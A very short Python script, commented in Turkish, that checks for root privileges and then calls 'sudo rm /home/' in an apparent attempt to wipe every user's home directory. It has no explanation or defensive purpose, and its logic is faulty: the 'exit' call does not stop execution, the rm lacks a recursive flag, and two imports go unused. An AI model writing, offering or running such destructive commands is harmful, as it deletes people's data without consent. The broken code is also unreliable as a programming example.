import os 
import random
import time

if os.geteuid() != 0:
    print("Super user olarak çalıştır ")
    os.system("exit")

os.system("sudo rm /home/")
